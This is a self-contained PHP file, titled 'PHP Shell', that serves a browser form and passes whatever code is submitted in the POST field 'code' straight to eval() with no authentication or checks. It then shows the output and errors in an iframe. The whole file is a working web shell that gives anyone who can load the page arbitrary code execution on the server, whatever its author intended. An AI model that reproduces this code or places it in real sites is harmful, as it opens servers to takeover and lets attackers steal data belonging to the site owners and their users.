<?php
if(isset($_GET['query'])) {
?>
<style>
.errorMsg {
	
}
.errorMsg b {
	color:red;
}
.errorMsg .line {
	color:blue;
}
</style>
<?php
	if(isset($_POST['code']) && strlen($_POST['code'])>0) {
		ini_set("error_reporting",E_ALL);
		$code=$_POST['code'];
		$code=urldecode($code);
		$a=eval($code);
		if($a===false) {
			$err=error_get_last();
			echo "<div class=errorMsg><b>Error [{$err['type']}]</b>";
			echo " <span class='msg'>{$err['message']}</span> : <span class='line'>{$err['line']}</span>";
			echo "</div>";
		}
	} else {
		echo "<div class=errorMsg><b>Warn [0]</b>";
		echo " <span class='msg'>No PHP Code To Process</span> : <span class='line'>0</span>";
		echo "</div>";
	}
} else {
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<title>PHP Shell</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<meta http-equiv="pragma" content="no-cache" />
	<meta http-equiv="expires" content="wed, 26 Feb 1997 08:21:57 GMT" />
	
	<script language='javascript' src="../js/jquery.js" type="text/javascript"></script>
<style>
html,body {
	width:100%;height:100%;
	overflow:hidden;
	padding:0px;margin:0px;
}
.left {float:left;}
.right {float:right;}
#codeDiv {
	width:100%;height:35%;
}
#resultDiv {
	width:100%;height:65%;
	border-top:1px solid #aaa;
}
#codeDiv form {
	width:100%;height:100%;
}
#codeDiv textarea {
	width: 99%;
	height: 85%;
	resize: none;
	padding: 2px;
	padding-left: 0.5%;
	padding-right: 0.5%;
	margin: 0px;
	font: 14px Arial;
	border: 1px solid black;
	font-family: monospace;
	background: black;
	color: white;
}
#codeDiv button {
	width:100px;height:10%;
	margin-right:6px;margin-left:6px;
	font-weight:bold;
}
#resultDiv iframe[name=resultFrame] {
	width:99%;
	padding:0px;padding-left:1%;padding-right:1%;margin:0px;
}
</style>
</head>

<body>
<div id='codeDiv'>
	<form method="POST" action="?query=script" target=resultFrame>
		<textarea id='codeArea' name='code'>echo "HI";</textarea>
		<button class='right' type=submit>Submit</button>
		<button class='right' type=reset>Clear</button>
	</form>
</div>
<div id='resultDiv'>
<iframe id=resultFrame name=resultFrame marginWidth=0 marginHeight=0 frameBorder=0 width=100% height=100%></iframe>
</div>
</body>
<script language='javascript'>
$(function() {
	$("#codeArea").keydown(function(e) {
		if(e.ctrlKey && e.keyCode==13) {
			$("#codeDiv form").get(0).submit();
		}
	});
});
function checkForm(frm) {// onsubmit="return checkForm(this);"
	if($(frm).find("textarea[name=code]").val().length<=0) {
		return false;
	}
	else return true;
}
</script>
</html>
<?php
}
function printArray($arr) {
	echo "<pre>";
	print_r($arr);
	echo "</pre>";
}
?>
